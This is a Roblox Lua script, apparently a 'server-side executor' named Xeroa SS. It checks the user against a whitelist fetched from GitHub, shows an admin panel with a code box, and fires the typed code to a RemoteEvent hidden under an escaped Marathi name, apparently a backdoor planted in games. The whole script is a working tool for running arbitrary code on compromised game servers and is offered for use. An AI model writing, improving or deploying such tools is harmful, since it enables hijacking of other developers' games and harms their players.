-- [[ XEROA ADMIN SYSTEM - ALL-IN-ONE ]]
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

-- 1. WAIT FOR PLAYER (Fixes image_a64c1c.png)
local lPlayer = Players.LocalPlayer
if not lPlayer and RunService:IsClient() then
    lPlayer = Players:GetPlayers()[1] or Players.PlayerAdded:Wait()
end

-- 2. WHITELIST CHECK (Universal Version)
local whitelistURL = "https://raw.githubusercontent.com/superpickle425/XeroaSS/refs/heads/main/whitelist.lua"

local function fetchWhitelist()
    if RunService:IsStudio() then
        -- Use Studio's method
        return game:GetService("HttpService"):GetAsync(whitelistURL)
    else
        -- Use Executor's method
        return game:HttpGet(whitelistURL)
    end
end

local success, whitelistData = pcall(fetchWhitelist)

if success then
    whitelistData = whitelistData:gsub("%s+", "") -- Remove invisible characters
    if not string.find(whitelistData, tostring(lPlayer.UserId)) then
        print("Unauthorized User: " .. tostring(lPlayer.UserId)) 
        return 
    end
else
    warn("Whitelist Connection Error: " .. tostring(whitelistData))
    return
end
-- 3. THE UI (Admin Panel)
local PlayerGui = lPlayer:WaitForChild("PlayerGui")
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "AdminPanel"
screenGui.Parent = PlayerGui

local scrollingFrame = Instance.new("ScrollingFrame")
scrollingFrame.Size = UDim2.new(0.4, 0, 0.58, 0)
scrollingFrame.Position = UDim2.new(0.3, 0, 0.2, 0)
scrollingFrame.BackgroundColor3 = Color3.new(0, 0, 0)
scrollingFrame.BorderSizePixel = 2
scrollingFrame.BorderColor3 = Color3.fromRGB(85, 0, 127)
scrollingFrame.Parent = screenGui

local scriptTextBox = Instance.new("TextBox")
scriptTextBox.Size = UDim2.new(0.9, 0, 0.7, 0)
scriptTextBox.Position = UDim2.new(0.05, 0, 0.1, 0)
scriptTextBox.MultiLine = true
scriptTextBox.Text = ""
scriptTextBox.Parent = scrollingFrame

local executeButton = Instance.new("TextButton")
executeButton.Size = UDim2.new(0.4, 0, 0.1, 0)
executeButton.Position = UDim2.new(0.3, 0, 0.85, 0)
executeButton.Text = "Execute"
executeButton.Parent = scrollingFrame

-- 4. SERVER-SIDE LOGIC (The Remote Connection)
local ReplicatedStorage = game:GetService("ReplicatedStorage")
-- Marathi Name: डेटा_सिंक_इव्हेंट
local remote = ReplicatedStorage:FindFirstChild("\224\164\161\224\165\135\224\164\159\224\164\190_\224\164\184\224\164\191\224\164\130\224\164\149_\224\164\135\224\164\181\224\165\135\224\164\168\224\165\141\224\164\159")

executeButton.MouseButton1Click:Connect(function()
    if remote and scriptTextBox.Text ~= "" then
        remote:FireServer(scriptTextBox.Text)
    end
end)

print("Xeroa SS Loaded Successfully.")
